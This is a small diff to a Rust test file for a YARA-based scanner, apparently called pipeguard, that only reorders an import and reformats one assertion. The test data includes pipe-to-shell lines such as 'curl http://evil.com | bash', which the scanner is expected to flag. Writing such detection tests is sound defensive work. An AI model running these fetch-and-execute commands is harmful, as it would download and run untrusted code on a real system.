@@ -2,8 +2,8 @@
 
 use pipeguard::detection::scanner::YaraScanner;
 use pipeguard::detection::threat::ThreatLevel;
-use tempfile::TempDir;
 use std::fs;
+use tempfile::TempDir;
 
 // =============================================================================
 // Rule compilation edge cases
@@ -227,7 +227,10 @@ fn match_regex_pattern() {
     "#;
     let scanner = YaraScanner::from_source(rule).unwrap();
 
-    assert!(scanner.scan("curl http://evil.com | bash").unwrap().has_matches());
+    assert!(scanner
+        .scan("curl http://evil.com | bash")
+        .unwrap()
+        .has_matches());
     assert!(scanner.scan("curl -s url | bash -c").unwrap().has_matches());
     assert!(!scanner.scan("wget http://evil.com").unwrap().has_matches());
 }
